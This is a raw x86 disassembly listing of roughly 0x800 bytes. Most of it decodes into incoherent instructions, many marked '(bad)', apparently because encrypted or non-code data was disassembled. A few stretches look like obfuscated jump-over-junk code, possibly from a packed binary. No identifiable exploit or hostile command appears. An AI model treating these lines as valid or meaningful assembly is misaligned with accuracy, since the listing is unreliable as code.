  40437d:	xlat   BYTE PTR ds:[ebx]
  40437e:	ficomp WORD PTR [esi]
  404380:	add    BYTE PTR [ebp+0x40],0xad
  404384:	mov    cs,WORD PTR [edx+0x592a8a28]
  40438a:	test   DWORD PTR [ebx+0x7ff689e0],ecx
  404390:	arpl   WORD PTR [ecx-0x30],dx
  404393:	cmp    ecx,DWORD PTR [edi-0x28816c37]
  404399:	mov    al,0x6a
  40439b:	push   0xffffffd0
  40439d:	jmp    0x82116212
  4043a2:	sbb    al,0x9e
  4043a4:	push   eax
  4043a5:	mov    ebp,db5
  4043a8:	inc    esi
  4043a9:	imul   ecx,DWORD PTR [esi],0x12e76adb
  4043af:	mov    eax,ds:0x97d7a377
  4043b4:	dec    ecx
  4043b5:	sar    BYTE PTR [edx+0xe0de0b5],1
  4043bb:	mov    ch,BYTE PTR [ebp+0x6e]
  4043be:	cmp    dh,BYTE PTR [esi+0x16f2e7e]
  4043c4:	add    DWORD PTR [ebp+0x54],0xe3da9a96
  4043cb:	add    al,0x52
  4043cd:	ret    0x286e
  4043d0:	repnz xchg ebp,eax
  4043d2:	and    dl,BYTE PTR [esi+ebx*1-0x47]
  4043d6:	scas   eax,DWORD PTR es:[edi]
  4043d7:	mov    ecx,ebx
  4043d9:	cli    
  4043da:	lods   al,BYTE PTR ds:[esi]
  4043db:	xor    ch,dl
  4043dd:	xchg   esi,eax
  4043de:	sbb    BYTE PTR [edx],dh
  4043e0:	lock lods al,BYTE PTR ds:[esi]
  4043e2:	cs aam 0x3b
  4043e5:	call   0x6ca17778
  4043ea:	adc    eax,0xd6cdb838
  4043ef:	push   edi
  4043f0:	pop    ecx
  4043f1:	add    BYTE PTR ds:0x5575d8ee,0xfb
  4043f8:	loopne 0x4043ff
  4043fa:	pop    ecx
  4043fb:	inc    eax
  4043fc:	int    0x20
  4043fe:	call   0x44cab037
  404403:	jae    0x404443
  404405:	xor    eax,0xd04238fc
  40440a:	loopne 0x4043b4
  40440c:	shl    DWORD PTR [ebx],1
  40440e:	xor    DWORD PTR [ebx-0x3],ebp
  404411:	sbb    BYTE PTR [ebx],0xb
  404414:	add    edx,DWORD PTR [esi]
  404416:	pop    ss
  404417:	nop
  404418:	cmp    BYTE PTR [ebx-0x80],ch
  40441b:	into   
  40441c:	pop    ecx
  40441d:	imul   ecx,DWORD PTR [eax-0x49],0x24609e78
  404424:	out    dx,al
  404425:	push   edx
  404426:	mov    dh,0xd7
  404428:	fadd   DWORD PTR [ebx+0x42]
  40442b:	ret    
  40442c:	jmp    0x39a2d032
  404431:	js     0x404489
  404433:	bound  edx,QWORD PTR [eax-0x47a6b11a]
  404439:	lods   al,BYTE PTR ds:[esi]
  40443a:	fisubr WORD PTR [ecx+0x5d2e7f52]
  404440:	rcr    DWORD PTR [edx-0x31d41cc1],1
  404446:	idiv   BYTE PTR [ecx]
  404448:	aad    0x61
  40444a:	popf   
  40444b:	push   esi
  40444c:	or     esi,edi
  40444e:	bound  edi,QWORD PTR [edx]
  404450:	mov    ah,ah
  404452:	call   0xb507f505
  404457:	in     eax,0x60
  404459:	enter  0x463c,0x6
  40445d:	data16 daa 
  40445f:	stos   DWORD PTR es:[edi],eax
  404460:	adc    eax,0x52c7d435
  404465:	inc    edi
  404466:	imul   ebx,DWORD PTR [eax],0xdc9286a1
  40446c:	sub    al,0x31
  40446f:	lds    ebx,FWORD PTR [esi]
  404471:	adc    esi,ebp
  404473:	js     0x4044a9
  404475:	inc    eax
  404476:	sub    eax,0x178b400d
  40447b:	push   ds
  40447c:	or     ecx,ecx
  40447e:	xchg   BYTE PTR [edi-0x39685e41],bl
  404484:	lahf   
  404485:	iret   
  404486:	jle    0x4044ae
  404488:	fcomp  QWORD PTR [edi+0x75]
  40448b:	sahf   
  40448c:	sub    DWORD PTR ds:0x8ca48a78,ecx
  404492:	bound  edx,QWORD PTR [edx-0x28]
  404495:	aad    0xf4
  404497:	dec    esi
  404498:	or     eax,0xd64392f1
  40449d:	xchg   ecx,eax
  40449e:	sub    esp,DWORD PTR [eax+0x58bac9eb]
  4044a4:	cmp    eax,0x4d13ea5b
  4044a9:	in     al,dx
  4044aa:	sbb    ah,BYTE PTR [ecx]
  4044ac:	and    DWORD PTR [edi],esp
  4044ae:	fistp  QWORD PTR [esi-0x3196d5d8]
  4044b4:	inc    esp
  4044b5:	lahf   
  4044b6:	ins    BYTE PTR es:[edi],dx
  4044b7:	xchg   esp,eax
  4044b8:	ds frstpm(287 only) 
  4044bb:	call   0x91e870d9
  4044c0:	in     eax,0x8e
  4044c2:	repnz in eax,dx
  4044c4:	ret    0xb031
  4044c7:	fbld   TBYTE PTR [ebp+0x11]
  4044ca:	cmc    
  4044cb:	sar    DWORD PTR [edx+0x111f55bb],0xb
  4044d2:	imul   edx,DWORD PTR [edi+ebp*1-0x2e49bbf1],0x78c71e9f
  4044dd:	retf   
  4044de:	mov    ds:0x9bc2a54c,eax
  4044e3:	sti    
  4044e4:	stos   BYTE PTR es:[edi],al
  4044e5:	xor    DWORD PTR [edi+0x3cd9a383],esi
  4044eb:	xchg   edx,eax
  4044ec:	loope  0x4044f0
  4044ee:	adc    eax,0xfb55e048
  4044f3:	das    
  4044f4:	push   ebp
  4044f5:	pusha  
  4044f6:	push   ss
  4044f7:	push   esp
  4044f8:	dec    eax
  4044f9:	pop    ebp
  4044fa:	scas   eax,DWORD PTR es:[edi]
  4044fb:	push   esp
  4044fc:	xchg   edi,eax
  4044fd:	test   DWORD PTR [edx+eax*4+0x4053f379],eax
  404504:	std    
  404505:	push   0x3e
  404507:	xor    DWORD PTR [eax+0x3b],ecx
  40450a:	cmp    dl,BYTE PTR [edi-0x4a9195e0]
  404510:	xchg   esi,eax
  404511:	xchg   ecx,eax
  404512:	jo     0x4044ab
  404514:	fld    DWORD PTR [esi]
  404516:	pop    edx
  404517:	test   eax,0xfc29a7d3
  40451c:	in     eax,dx
  40451d:	cld    
  40451e:	test   al,0x57
  404520:	fnstenv [esi]
  404522:	mov    edx,0x4de6d381
  404527:	(bad)  
  404528:	pushf  
  404529:	jne    0x4044bc
  40452b:	push   esp
  40452c:	(bad)  
  40452d:	pop    ss
  40452e:	pop    ecx
  40452f:	mov    ds:0x5df0dc95,eax
  404534:	icebp  
  404535:	adc    DWORD PTR [eax+0x30],ecx
  404538:	scas   eax,DWORD PTR es:[edi]
  404539:	and    edi,0xffffff98
  40453c:	or     ch,al
  40453e:	jnp    0x4044c6
  404540:	xchg   ebx,edi
  404542:	aam    0xb9
  404544:	or     BYTE PTR [ecx+0x11],dh
  404547:	shl    BYTE PTR [edx+0x50],1
  40454a:	xchg   ecx,edx
  40454c:	ins    DWORD PTR es:[edi],dx
  40454d:	(bad)  [edx+0x266c9d79]
  404553:	and    al,0xb4
  404555:	gs push eax
  404557:	repz sbb DWORD PTR [eax-0x7b6315f1],edx
  40455e:	ins    DWORD PTR es:[edi],dx
  40455f:	mov    ?,WORD PTR [ecx+0x6c35c093]
  404565:	sbb    DWORD PTR [ebx+0x31],eax
  404568:	mov    ah,0x8c
  40456a:	pop    edi
  40456b:	mov    eax,0xf288168e
  404570:	repz cld 
  404572:	sbb    ch,0x70
  404575:	or     DWORD PTR [esi-0x7567c5e3],0x3e007f7d
  40457f:	xchg   esp,eax
  404580:	shl    BYTE PTR [eax+0x2f],0x6e
  404584:	nop    esi
  404587:	ja     0x40453f
  404589:	repnz rol DWORD PTR [ebx+eax*8+0x1546d322],1
  404591:	dec    edx
  404592:	dec    esi
  404593:	data16 xchg dl,ah
  404596:	cmc    
  404597:	pop    esi
  404598:	inc    esi
  404599:	test   al,0xb5
  40459b:	push   0x15
  40459d:	fwait
  40459e:	(bad)  
  40459f:	shl    DWORD PTR [edi-0x4b],1
  4045a2:	aad    0xf
  4045a4:	push   ebx
  4045a5:	mov    ah,0x58
  4045a7:	mov    bl,0x7b
  4045a9:	out    0xa0,al
  4045ab:	bound  edx,QWORD PTR [ebx+edi*8]
  4045ae:	inc    eax
  4045af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045b0:	sbb    ecx,DWORD PTR [ebp+0x5362be70]
  4045b6:	fs aaa 
  4045b8:	out    dx,eax
  4045b9:	push   eax
  4045ba:	popf   
  4045bb:	mov    edx,0xeeca8db9
  4045c0:	xchg   esi,eax
  4045c1:	aam    0xe1
  4045c3:	int3   
  4045c4:	xor    eax,0xb497aca5
  4045c9:	test   DWORD PTR [ebp+0x43134bad],edi
  4045cf:	scas   al,BYTE PTR es:[edi]
  4045d0:	sub    DWORD PTR [ebx+0x44],edi
  4045d3:	adc    BYTE PTR ds:0xd250f3fe,0x1
  4045da:	cdq    
  4045db:	repz push 0x3f8d5649
  4045e1:	arpl   WORD PTR [esi+ebp*4-0x611a2ec7],bx
  4045e8:	sbb    DWORD PTR [edx+edi*8+0x7799f662],esp
  4045ef:	mov    edx,0x48c82cbb
  4045f4:	dec    esp
  4045f5:	retf   
  4045f6:	(bad)  
  4045f7:	adc    BYTE PTR [ebx+0x4b300cb1],0x6b
  4045fe:	inc    eax
  4045ff:	xchg   edi,eax
  404600:	cdq    
  404601:	or     esi,DWORD PTR [ebx]
  404603:	fsubr  DWORD PTR [edi]
  404605:	mov    ebp,0xba5dea20
  40460a:	sbb    ecx,DWORD PTR ds:0x2f3e978f
  404610:	addr16 inc edx
  404612:	jecxz  0x4045b2
  404614:	push   DWORD PTR [eax+eax*8+0x1]
  404618:	xchg   edx,eax
  404619:	(bad)  
  40461a:	jl     0x404623
  40461c:	ret    
  40461d:	mov    cl,0x3f
  40461f:	aaa    
  404620:	push   ss
  404621:	das    
  404622:	cwde   
  404623:	pusha  
  404624:	adc    ch,ch
  404626:	jne    0x404663
  404628:	ror    edi,0x6c
  40462b:	jp     0x404601
  40462d:	jo     0x40461e
  40462f:	int    0x19
  404631:	imul   ebx,DWORD PTR ds:0x7c82cf26,0xffffff97
  404638:	shl    DWORD PTR [edx+0xb],cl
  40463b:	sub    bh,BYTE PTR [ecx-0x15]
  40463e:	pop    esp
  40463f:	or     al,BYTE PTR [edi-0x4bdceebd]
  404645:	into   
  404646:	out    dx,al
  404647:	add    eax,0x839169b1
  40464c:	push   edi
  40464d:	(bad)  
  40464e:	xchg   esi,eax
  40464f:	mov    dl,0xe6
  404651:	sub    eax,0x5b6308eb
  404656:	xchg   edi,eax
  404657:	outs   dx,BYTE PTR ds:[esi]
  404658:	mov    bl,0x4a
  40465a:	xor    bl,bl
  40465c:	(bad)  
  40465e:	sub    BYTE PTR [ebx],dl
  404660:	out    0x6a,al
  404662:	pusha  
  404663:	addr16 sbb edi,ecx
  404666:	mov    esi,0x67656f51
  40466b:	add    eax,0x8ecb9e7f
  404670:	sbb    ebx,esp
  404672:	lods   al,BYTE PTR ds:[esi]
  404673:	cs (bad) 
  404675:	outs   dx,BYTE PTR ds:[esi]
  404676:	test   al,0x99
  404678:	int3   
  404679:	hlt    
  40467a:	inc    esp
  40467b:	daa    
  40467c:	mov    ds:0xc8b1f192,al
  404681:	dec    edi
  404682:	test   DWORD PTR [edx+0x5f],esp
  404685:	pop    ebx
  404686:	adc    al,0x3e
  404688:	or     eax,0x6e323153
  40468d:	jge    0x40468e
  40468f:	popa   
  404690:	pushf  
  404691:	addr16 popf 
  404693:	lds    ecx,FWORD PTR [ebp+0x19]
  404696:	inc    DWORD PTR [esi-0xd94adb2]
  40469c:	adc    eax,DWORD PTR [ebx]
  40469e:	xchg   ebp,eax
  40469f:	lahf   
  4046a0:	or     edi,DWORD PTR [edx-0x78]
  4046a3:	ret    0x8f93
  4046a6:	rcr    DWORD PTR [edi+0x1db5cb22],cl
  4046ac:	inc    ebx
  4046ad:	(bad)  
  4046ae:	and    BYTE PTR [eax+0x4d0a7061],bh
  4046b4:	mov    eax,0x4784b0dd
  4046b9:	jecxz  0x40464c
  4046bb:	ficomp WORD PTR [ecx+0x410e8ee6]
  4046c1:	adc    al,0xa2
  4046c3:	test   al,0x38
  4046c5:	out    0xbc,eax
  4046c7:	aaa    
  4046c8:	lea    esi,[eax-0x613999e6]
  4046ce:	rcl    DWORD PTR [edx-0x1a],0x8d
  4046d2:	enter  0x96ca,0x4f
  4046d6:	ins    BYTE PTR es:[edi],dx
  4046d7:	fild   QWORD PTR [ecx]
  4046d9:	xor    BYTE PTR [ecx],0x48
  4046dc:	mov    esp,0x36e54895
  4046e1:	inc    eax
  4046e2:	and    DWORD PTR [esi],edi
  4046e4:	scas   al,BYTE PTR es:[edi]
  4046e5:	push   ebx
  4046e6:	test   BYTE PTR [ebx+0x16dea537],cl
  4046ec:	ss jno 0x4046ac
  4046ef:	clc    
  4046f0:	aas    
  4046f1:	dec    esi
  4046f2:	cmp    edx,esi
  4046f4:	and    eax,0x597f3692
  4046f9:	cmc    
  4046fa:	test   eax,0xc8e55e66
  4046ff:	stos   DWORD PTR es:[edi],eax
  404700:	lods   eax,DWORD PTR ds:[esi]
  404701:	and    DWORD PTR [eax+0x105f1367],0xc34ff0b2
  40470b:	mov    al,0x3d
  40470d:	adc    DWORD PTR [edi+eiz*1],ebx
  404710:	dec    esp
  404711:	jle    0x404758
  404713:	sbb    eax,0xc1761b2a
  404718:	sub    DWORD PTR [eax+0xc],esp
  40471b:	test   DWORD PTR [edx+0x4d],eax
  40471e:	ds jmp 0x404792
  404721:	nop
  404722:	mov    ecx,0x535cc394
  404727:	ret    
  404728:	lock sub esp,DWORD PTR [ebx+ebp*8+0x37]
  40472d:	inc    eax
  40472e:	loop   0x404790
  404730:	imul   edx,DWORD PTR [ebx+0x32],0x40
  404734:	jl     0x404735
  404736:	push   cs
  404737:	popf   
  404738:	popa   
  404739:	je     0x404724
  40473b:	out    0xf,eax
  40473d:	lods   al,BYTE PTR ds:[esi]
  40473e:	rol    DWORD PTR [edx],1
  404740:	or     DWORD PTR ds:0x428273,0x42822f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x42824f
  404753:	or     DWORD PTR ds:0x42834f,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0xbcd3a790
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [eax+0x2be10527],ah
  40477e:	test   al,0xa1
  404780:	pop    es
  404781:	aad    0xe9
  404783:	cmc    
  404784:	test   eax,0x507a66ab
  404789:	fild   DWORD PTR [edx-0x4adb33c5]
  40478f:	cdq    
  404790:	jmp    0xab674363
  404795:	pop    ecx
  404796:	xchg   esp,eax
  404797:	mov    bh,0x7
  404799:	xchg   al,ah
  40479b:	jle    0x40478f
  40479d:	cmp    al,0x3b
  40479f:	test   eax,0xf8420ce2
  4047a4:	ins    BYTE PTR es:[edi],dx
  4047a5:	jo     0x40479e
  4047a7:	and    BYTE PTR ds:0x59d8e0c6,0xb9
  4047ae:	or     al,0xf6
  4047b0:	xor    eax,0x2390f427
  4047b5:	out    dx,eax
  4047b6:	push   ds
  4047b7:	sbb    dh,bh
  4047b9:	xchg   esi,eax
  4047ba:	sbb    dl,BYTE PTR [esi+0x4c68ee4c]
  4047c0:	push   esi
  4047c1:	ins    BYTE PTR es:[edi],dx
  4047c2:	test   ebp,edi
  4047c4:	retf   0xf264
  4047c7:	fsincos 
  4047c9:	loopne 0x4047be
  4047cb:	add    al,0x97
  4047cd:	lock mov esi,0x7c34091
  4047d3:	adc    DWORD PTR [eax],ebp
  4047d5:	in     eax,0x97
  4047d7:	sbb    dl,BYTE PTR [ebp-0x568ac9cb]
  4047dd:	ins    DWORD PTR es:[edi],dx
  4047de:	in     eax,0x5e
  4047e0:	mov    bl,0xaa
  4047e2:	ins    DWORD PTR es:[edi],dx
  4047e3:	fnstsw WORD PTR [edi-0x10]
  4047e6:	js     0x404823
  4047e8:	in     eax,dx
  4047e9:	mov    ebp,0x8c734dbb
  4047ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047ef:	inc    ebp
  4047f0:	jge    0x404849
  4047f2:	js     0x404812
  4047f4:	mov    DWORD PTR [ebx],ebx
  4047f6:	imul   esp,DWORD PTR [esi],0x79eb6155
  4047fc:	jecxz  0x40484f
  4047fe:	(bad)  
  404800:	mov    ebx,DWORD PTR [esp+eax*2]
  404803:	out    0x57,al
  404805:	jo     0x40487d
  404807:	fimul  WORD PTR [ebx]
  404809:	inc    eax
  40480a:	xchg   esp,eax
  40480b:	pop    ecx
  40480c:	dec    ebx
  40480d:	shl    BYTE PTR [esi-0x5d],1
  404810:	loope  0x40486a
  404812:	rol    BYTE PTR [esi-0x2c54009b],cl
  404818:	mov    bh,0x6a
  40481a:	adc    DWORD PTR [esi],ecx
  40481c:	shr    edx,cl
  40481e:	sahf   
  40481f:	mov    eax,ds:0xfa90bb5b
  404824:	imul   ecx,DWORD PTR [esi+0x7f33bee7],0x657c3eac
  40482e:	mov    al,ds:0x4bb2c60b
  404833:	xchg   ebx,eax
  404834:	gs popf 
  404836:	adc    DWORD PTR [ebx+0x30],esp
  404839:	in     eax,0xf6
  40483b:	lahf   
  40483c:	loope  0x40485a
  40483e:	mov    eax,ds:0xbaddc017
  404843:	xchg   ebx,eax
  404844:	and    esi,DWORD PTR [ebx+0x58b56b1c]
  40484a:	jo     0x4048bf
  40484c:	test   DWORD PTR [eax],ebx
  40484e:	mov    al,0x12
  404850:	push   edi
  404851:	jo     0x4047d5
  404853:	mov    BYTE PTR [ebx+0x14de8ea6],dl
  404859:	xchg   esp,eax
  40485a:	xchg   esp,eax
  40485b:	test   ecx,edx
  40485d:	fimul  DWORD PTR [ebx+0xa]
  404860:	dec    ebx
  404861:	out    dx,al
  404862:	std    
  404863:	jge    0x4048b4
  404865:	mov    esp,DWORD PTR ds:[ecx+0x7dd16ee1]
  40486c:	jmp    0xb822926f
  404871:	movaps XMMWORD PTR [esi],xmm7
  404874:	xor    cl,BYTE PTR [ebp+0x68]
  404877:	adc    eax,0x1a5b9b0b
  40487c:	jo     0x4048c6
  40487e:	adc    DWORD PTR [ecx+0x194745dc],esp
  404884:	fild   QWORD PTR [edx-0x74bf0ffe]
  40488a:	dec    edx
  40488b:	cmp    BYTE PTR [edx-0x715aab4a],dh
  404891:	in     eax,0x8c
  404893:	mov    al,ds:0xcbd5c48f
  404898:	clc    
  404899:	pop    esp
  40489a:	(bad)  
  40489b:	int3   
  40489c:	out    0xc0,al
  40489e:	arpl   WORD PTR [eax+edi*4],bp
  4048a1:	scas   eax,DWORD PTR es:[edi]
  4048a2:	mov    ecx,0x1408e18f
  4048a7:	mov    bh,0xc1
  4048a9:	jbe    0x4048f0
  4048ab:	scas   eax,DWORD PTR es:[edi]
  4048ac:	cmp    ch,BYTE PTR [ebp-0x17c7214e]
  4048b2:	dec    edi
  4048b3:	lds    esi,FWORD PTR [esi-0x37b7b59d]
  4048b9:	mov    bl,0x56
  4048bb:	rcl    BYTE PTR [edi],0xb4
  4048be:	imul   eax,DWORD PTR [ecx+0x46],0x1866c363
  4048c5:	pop    ebp
  4048c6:	push   0x529816a4
  4048cb:	dec    esp
  4048cc:	cmp    eax,0xdce8f6f5
  4048d1:	fstp   DWORD PTR [edx-0x406445df]
  4048d7:	clc    
  4048d8:	(bad)  
  4048d9:	retf   0x4ec1
  4048dc:	and    eax,0x90474cca
  4048e1:	add    al,0xd3
  4048e3:	mov    ch,0x25
  4048e5:	clc    
  4048e6:	xchg   edi,eax
  4048e7:	call   0x63e4a451
  4048ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ed:	lods   al,BYTE PTR ds:[esi]
  4048ee:	mov    BYTE PTR ds:0xa946040f,dh
  4048f4:	retf   0x1ae8
  4048f7:	cmp    eax,0xb6858359
  4048fc:	retf   
  4048fd:	stc    
  4048fe:	sub    al,0x8b
  404900:	ffreep st(6)
  404902:	jmp    0x741a:0xe1f03e5e
  404909:	ins    DWORD PTR es:[edi],dx
  40490a:	arpl   WORD PTR [ecx-0x2],ax
  40490d:	leave  
  40490e:	jg     0x4048bc
  404910:	xchg   esp,eax
  404911:	jne    0x4048a8
  404913:	das    
  404914:	jmp    0x6de3caad
  404919:	mov    ds:0x13931b05,al
  40491e:	pop    es
  40491f:	adc    ch,BYTE PTR [edx+0x13]
  404922:	int3   
  404923:	repz iret 
  404925:	add    bh,BYTE PTR [edi]
  404927:	xor    eax,0xa1f4c9b6
  40492c:	push   eax
  40492d:	retf   0xceb0
  404930:	outs   dx,BYTE PTR ds:[esi]
  404931:	dec    ecx
  404932:	jp     0x40499a
  404934:	std    
  404935:	mov    esp,0x8e9da9c5
  40493a:	mov    edx,0x340ed5ec
  40493f:	push   ds
  404940:	jb     0x40498c
  404942:	pop    ebp
  404943:	jb     0x4048ef
  404945:	nop
  404946:	pop    ecx
  404947:	mov    WORD PTR [ebx],?
  404949:	nop
  40494a:	xchg   ecx,eax
  40494b:	lods   al,BYTE PTR ds:[esi]
  40494c:	leave  
  40494d:	ffree  st(5)
  40494f:	sbb    al,0x78
  404951:	pop    esi
  404952:	stos   BYTE PTR es:[edi],al
  404953:	sti    
  404954:	cmp    esi,ecx
  404956:	cmp    edi,ebx
  404958:	adc    BYTE PTR [edi+0x73],ah
  40495b:	jmp    0x751b:0xb9e9fdf6
  404962:	ret    0x342e
  404965:	push   esp
  404966:	xor    BYTE PTR [esi+edx*1+0x555f2615],bl
  40496d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40496e:	push   ecx
  40496f:	pop    ebx
  404970:	nop
  404971:	push   edx
  404972:	mov    edi,0xf3b5a716
  404977:	mov    ds:0x5dcf90c,al
  40497c:	mov    bh,BYTE PTR [eax+0x62754bca]
  404982:	hlt    
  404983:	push   ds
  404984:	out    dx,al
  404985:	clc    
  404986:	push   esi
  404987:	mov    al,0x6c
  404989:	scas   al,BYTE PTR es:[edi]
  40498a:	sub    eax,0x1b7ee73f
  40498f:	ins    BYTE PTR es:[edi],dx
  404990:	ficom  DWORD PTR [ecx+0x777a36f]
  404996:	or     eax,0x98a9f487
  40499b:	daa    
  40499c:	call   0xff9ebf33
  4049a1:	pop    edi
  4049a2:	(bad)  
  4049a4:	mov    ebp,0x4fee8afe
  4049a9:	outs   dx,BYTE PTR ds:[esi]
  4049aa:	lock scas eax,DWORD PTR es:[edi]
  4049ac:	stos   BYTE PTR es:[edi],al
  4049ad:	cmp    DWORD PTR [edi+0x23094404],ebp
  4049b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049b4:	cmp    al,0xd9
  4049b6:	dec    edx
  4049b7:	inc    eax
  4049b8:	inc    esp
  4049b9:	aad    0x22
  4049bb:	xchg   ecx,eax
  4049bc:	shl    BYTE PTR [edx+0x5f],0x46
  4049c0:	sbb    BYTE PTR [ebp-0x6ad7873],ch
  4049c6:	add    eax,0xcf3850a4
  4049cb:	call   0x5988:0x20ded5ef
  4049d2:	mov    ch,0x90
  4049d4:	cld    
  4049d5:	push   0xffffffdc
  4049d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d8:	xor    DWORD PTR [ebx+0x19999bf0],edx
  4049de:	push   DWORD PTR [ebx-0x14]
  4049e1:	aaa    
  4049e2:	repnz inc eax
  4049e4:	ficom  DWORD PTR [ecx+0xafd5225]
  4049ea:	sub    al,0xef
  4049ec:	shl    DWORD PTR [edx-0x7d],cl
  4049ef:	test   eax,0xaa331894
  4049f4:	fwait
  4049f5:	mov    DWORD PTR [ebx],ecx
  4049f7:	paddsb mm2,mm1
  4049fa:	mov    ds:0x7f73ed9f,al
  4049ff:	sbb    BYTE PTR [esp+eax*4-0x5e],0x8
  404a04:	sub    BYTE PTR [edx-0x3d],ah
  404a07:	dec    edx
  404a08:	jno    0x4049ac
  404a0a:	xlat   BYTE PTR ds:[ebx]
  404a0b:	mov    WORD PTR [eax],cs
  404a0d:	lds    ebx,FWORD PTR [ebp+eiz*8+0x19cfcd2c]
  404a14:	shr    ebx,0x74
  404a17:	push   ds
  404a18:	push   es
  404a19:	les    esi,FWORD PTR [ebx+0xd]
  404a1c:	int3   
  404a1d:	fild   WORD PTR [edx+0x5f6ca74]
  404a23:	or     DWORD PTR [ecx-0x6079bc57],ebp
  404a29:	leave  
  404a2a:	lods   al,BYTE PTR ds:[esi]
  404a2b:	test   eax,0x3adfba75
  404a30:	fcmovnu st,st(0)
  404a32:	rcr    esp,1
  404a34:	xor    BYTE PTR [edi-0x4e],bl
  404a37:	mov    edi,0x52e57b28
  404a3c:	(bad)  
  404a3d:	out    0xd2,al
  404a3f:	into   
  404a40:	mov    al,0x3d
  404a42:	iret   
  404a43:	test   DWORD PTR [edx],edx
  404a45:	test   eax,0x6e33e48
  404a4a:	push   ecx
  404a4b:	cmp    DWORD PTR [ebx-0x69],0x23b2c2b5
  404a52:	jo     0x404a1e
  404a54:	mov    edi,ebp
  404a56:	mov    edx,0xb8196490
  404a5b:	pop    ebp
  404a5c:	or     al,0x82
  404a5e:	inc    ebx
  404a5f:	(bad)  
  404a60:	xchg   ebp,eax
  404a61:	mov    DWORD PTR [ebx],eax
  404a63:	sub    BYTE PTR [edi+edx*1+0x471ffa1b],ch
  404a6a:	(bad)  
  404a6c:	mov    al,0x2a
  404a6e:	and    cl,BYTE PTR [ecx-0x2c]
  404a71:	(bad)  
  404a72:	gs fwait
  404a74:	jg     0x404a47
  404a76:	dec    ecx
  404a77:	or     ecx,DWORD PTR [ecx+0x7da4b803]
  404a7d:	jle    0x404a67
  404a7f:	fstp   DWORD PTR [esi+0x2d5c5005]
  404a85:	cmp    al,0x31
  404a87:	int3   
  404a88:	push   esp
  404a89:	std    
  404a8a:	in     eax,0xf7
  404a8c:	xor    edx,edx
  404a8e:	sub    eax,0xbcdf5e36
  404a93:	fidiv  DWORD PTR ds:0xd2d6eed6
  404a99:	push   es
  404a9a:	clc    
  404a9b:	ds and al,0x85
  404a9e:	mov    cs,edx
  404aa0:	ins    DWORD PTR es:[edi],dx
  404aa1:	adc    al,0x7f
  404aa3:	int3   
  404aa4:	pop    edx
  404aa5:	mov    ds:0x9298f45e,al
  404aaa:	das    
  404aab:	icebp  
  404aac:	pop    edi
  404aad:	popf   
  404aae:	ins    DWORD PTR es:[edi],dx
  404aaf:	mov    al,0x66
  404ab1:	(bad)  
  404ab2:	lods   eax,DWORD PTR ds:[esi]
  404ab3:	aad    0xb2
  404ab5:	add    esi,edx
  404ab7:	pop    ss
  404ab8:	retf   
  404ab9:	jle    0x404aab
  404abb:	cmp    bh,BYTE PTR [esi]
  404abd:	push   ecx
  404abe:	dec    ecx
  404abf:	cmp    al,0x53
  404ac1:	jp     0x404b0e
  404ac3:	or     edx,DWORD PTR [ebx+ebx*4-0x50d2a6fc]
  404aca:	push   edi
  404acb:	int3   
  404acc:	jno    0x404ab8
  404ace:	pushf  
  404acf:	imul   edi,DWORD PTR [edx],0xffffffdf
  404ad2:	mov    ecx,0x5623afe6
  404ad7:	sahf   
  404ad8:	inc    ebx
  404ad9:	add    edi,DWORD PTR [ebp+0x68b7164d]
  404adf:	sbb    eax,0xdd826d64
  404ae4:	mov    cl,0x43
  404ae6:	xchg   edi,eax
  404ae7:	aad    0x78
  404ae9:	pop    edi
  404aea:	shl    BYTE PTR [edx],cl
  404aec:	fld    st(0)
  404aee:	mul    BYTE PTR [ebx]
  404af0:	dec    eax
  404af1:	cmpxchg DWORD PTR [esi+ebx*4+0x411bee69],eax
  404af9:	lods   eax,DWORD PTR ds:[si]
  404afb:	pop    ecx
  404afc:	and    al,0xdc
  404afe:	sub    ebx,DWORD PTR [eax]
  404b00:	mov    ds:0x8cd99f42,al
  404b05:	cli    
  404b06:	lods   eax,DWORD PTR ds:[esi]
  404b07:	xchg   ebx,eax
  404b08:	sub    BYTE PTR [edi-0x36c6c7af],cl
  404b0e:	(bad)  ds:0x99854014
  404b14:	out    0x9f,eax
  404b16:	add    eax,0xde590c32
  404b1b:	push   0xffffffdb
  404b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b1e:	pop    esi
  404b1f:	or     al,0xe2
  404b21:	jg     0x404af0
  404b23:	(bad)  
  404b24:	jbe    0x404b17
  404b26:	ja     0x404b3a
  404b28:	mov    ds:0xc5b6629a,eax
  404b2d:	popa   
  404b2e:	sbb    eax,0x9deb700c
  404b33:	fs dec ebp
  404b35:	pop    edx
  404b36:	stos   BYTE PTR es:[edi],al
  404b37:	fst    DWORD PTR [eax-0x74f474b5]
  404b3d:	push   ebx
  404b3e:	add    al,0x31
  404b40:	jge    0x404b26
  404b42:	add    DWORD PTR ds:0x428263,0x4282d7
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	sbb    BYTE PTR [ebp+0x6],dh
  404b62:	push   0x60
  404b64:	rcr    DWORD PTR [eax],0x18
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    BYTE PTR [esi-0x65d72c94],bh
  404b70:	icebp  
  404b71:	xor    BYTE PTR [edx+0x1f],ah
  404b74:	dec    eax
  404b75:	in     eax,0xd8
  404b77:	cmp    edx,eax
  404b79:	push   edx
  404b7a:	aad    0x1d
  404b7c:	pop    ebx
  404b7d:	xchg   ebx,eax
